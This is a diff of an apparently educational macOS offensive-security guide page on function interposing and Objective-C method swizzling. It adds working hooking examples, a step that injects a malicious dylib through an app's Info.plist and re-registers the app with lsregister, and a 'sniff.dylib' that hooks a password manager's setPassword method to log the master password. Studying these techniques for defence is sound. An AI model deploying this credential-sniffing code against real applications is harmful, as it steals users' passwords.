@@ -16,7 +16,7 @@
 
 Create a **dylib** with an **`__interpose`** section (or a section flagged with **`S_INTERPOSING`**) containing tuples of **function pointers** that refer to the **original** and the **replacement** functions.
 
-Then, **inject** the dylib with **`DYLD_INSERT_LIBRARIES`** (the interposing needs occur before the main app lodas). Obviously this restriction has the **restrictions** applied to the use of DYLD\_INSERT\_LIBRARIES.&#x20;
+Then, **inject** the dylib with **`DYLD_INSERT_LIBRARIES`** (the interposing needs occur before the main app loads). Obviously the [**restrictions** applied to the use of **`DYLD_INSERT_LIBRARIES`** applies here also](../macos-proces-abuse/macos-library-injection/#check-restrictions).&#x20;
 
 ### Interpose printf
 
@@ -34,7 +34,7 @@ int my_printf(const char *format, ...) {
     //int ret = vprintf(format, args);
     //va_end(args);
 
-    int ret = printf("[+] Hello from interpose\n");
+    int ret = printf("Hello from interpose\n");
     return ret;
 }
 
@@ -50,21 +50,50 @@ __attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned lon
 #include <stdio.h>
 
 int main() {
-    printf("Hello, World!\n");
+    printf("Hello World!\n");
     return 0;
 }
+```
+{% endtab %}
+
+{% tab title="interpose2.c" %}
+```c
+// Just another way to define an interpose
+// gcc -dynamiclib interpose2.c -o interpose2.dylib
+
+#include <stdio.h>
+
+#define DYLD_INTERPOSE(_replacement, _replacee) \
+    __attribute__((used)) static struct { \
+        const void* replacement; \
+        const void* replacee; \
+    } _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
+        (const void*) (unsigned long) &_replacement, \
+        (const void*) (unsigned long) &_replacee \
+    };
+
+int my_printf(const char *format, ...)
+{
+    int ret = printf("Hello from interpose\n");
+    return ret;
+}
+
+DYLD_INTERPOSE(my_printf,printf);
 ```
 {% endtab %}
 {% endtabs %}
 
 ```bash
 DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
-[+] Hello from interpose
+Hello from interpose
+
+DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
+Hello from interpose
 ```
 
 ## Method Swizzling
 
-In ObjectiveC this is how a method is called: `[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`
+In ObjectiveC this is how a method is called like: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**
 
 It's needed the **object**, the **method** and the **params**. And when a method is called a **msg is sent** using the function **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`
 
@@ -148,7 +177,11 @@ int main() {
 
 ### Method Swizzling with method\_exchangeImplementations
 
-The function method\_exchangeImplementations allows to change the address of one function for the other. So when a function is called what is executed is the other one.
+The function **`method_exchangeImplementations`** allows to **change** the **address** of the **implementation** of **one function for the other**.
+
+{% hint style="danger" %}
+So when a function is called what is **executed is the other one**.
+{% endhint %}
 
 ```objectivec
 //gcc -framework Foundation swizzle_str.m -o swizzle_str
@@ -193,6 +226,12 @@ int main(int argc, const char * argv[]) {
     return 0;
 }
 ```
+
+{% hint style="warning" %}
+In this case if the **implementation code of the legit** method **verifies** the **method** **name** it could **detect** this swizzling and prevent it from running.
+
+The following technique doesn't have this restriction.
+{% endhint %}
 
 ### Method Swizzling with method\_setImplementation
 
@@ -268,11 +307,61 @@ So the attacker vector would be to either find a vulnerability or strip the sign
 <key>LSEnvironment</key>
 <dict>
     <key>DYLD_INSERT_LIBRARIES</key> 
-    <string>/Applications/MacPass.app/Contents/malicious.dylib</string>
+    <string>/Applications/Application.app/Contents/malicious.dylib</string>
 </dict>
 ```
 
+and then **re-register** the application:
+
+{% code overflow="wrap" %}
+```bash
+/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
+```
+{% endcode %}
+
 Add in that library the hooking code to exfiltrate the information: Passwords, messages...
+
+{% hint style="danger" %}
+Note that in newer versions of macOS if you **strip the signature** of the application binary and it was previously executed, macOS **won't be executing the application** anymore.
+{% endhint %}
+
+#### Library example
+
+```objectivec
+// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib
+
+// If you added env vars in the Info.plist don't forget to call lsregister as explained before
+
+// Listen to the logs with something like:
+// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'
+
+#include <Foundation/Foundation.h>
+#import <objc/runtime.h>
+
+// Here will be stored the real method (setPassword in this case) address
+static IMP real_setPassword = NULL;
+
+static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
+{
+    // Function that will log the password and call the original setPassword(pass, file_path) method
+    NSLog(@"[+] Password is: %@", password);
+    
+    // After logging the password call the original method so nothing breaks.
+    return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
+}
+
+// Library constructor to execute
+__attribute__((constructor))
+static void customConstructor(int argc, const char **argv) {
+    // Get the real method address to not lose it
+    Class classMPDocument = NSClassFromString(@"MPDocument");
+    Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));
+    
+    // Make the original method setPassword call the fake implementation one
+    IMP fake_IMP = (IMP)custom_setPassword;
+    real_setPassword = method_setImplementation(real_Method, fake_IMP);
+}
+```
 
 ## References
 
